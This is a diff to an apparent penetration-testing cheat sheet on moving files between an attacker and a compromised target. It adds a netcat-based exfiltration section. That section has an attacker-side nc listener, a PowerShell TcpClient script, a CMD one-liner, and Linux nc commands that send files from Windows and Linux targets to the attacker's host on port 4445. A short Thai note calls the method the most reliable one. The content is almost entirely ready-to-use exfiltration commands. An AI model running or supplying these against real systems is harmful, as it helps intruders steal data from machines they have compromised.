@@ -9,6 +9,7 @@
 - [Quick Check](#quick-check)
 - [Attacker → Target](#attacker--target-download-to-target)
 - [Target → Attacker](#target--attacker-exfiltration)
+  - [Netcat Transfer](#netcat-file-transfer-reliable-)
 - [Windows Methods](#windows-methods)
 - [Linux Methods](#linux-methods)
 - [Living off the Land](#living-off-the-land-lolbins)
@@ -114,9 +115,39 @@ scp /path/to/file user@$lhost:/tmp/
 ### Send Files from Windows Target
 
 ```powershell
-# PowerShell upload
+# PowerShell upload via HTTP POST
 $bytes = [System.IO.File]::ReadAllBytes("C:\file.txt")
 Invoke-WebRequest -Uri "http://$lhost/upload" -Method POST -Body $bytes
+```
+
+### Netcat File Transfer (Reliable ✅)
+
+> **ใช้เมื่อ SMB/HTTP ไม่ work - ง่ายและ reliable ที่สุด**
+
+**Attacker (Receive):**
+```shell
+nc -nlvp 4445 > received_file.zip
+```
+
+**Windows Target (Send via PowerShell):**
+```powershell
+$bytes = [IO.File]::ReadAllBytes("C:\Temp\file.zip")
+$socket = New-Object Net.Sockets.TcpClient("$lhost", 4445)
+$stream = $socket.GetStream()
+$stream.Write($bytes, 0, $bytes.Length)
+$socket.Close()
+```
+
+**Windows Target (Send via CMD - one-liner):**
+```cmd
+powershell -c "$b=[IO.File]::ReadAllBytes('C:\Temp\file.zip');$s=New-Object Net.Sockets.TcpClient('%lhost%',4445);$t=$s.GetStream();$t.Write($b,0,$b.Length);$s.Close()"
+```
+
+**Linux Target (Send):**
+```shell
+nc $lhost 4445 < /path/to/file
+# or
+cat /path/to/file | nc $lhost 4445
 ```
 
 ---
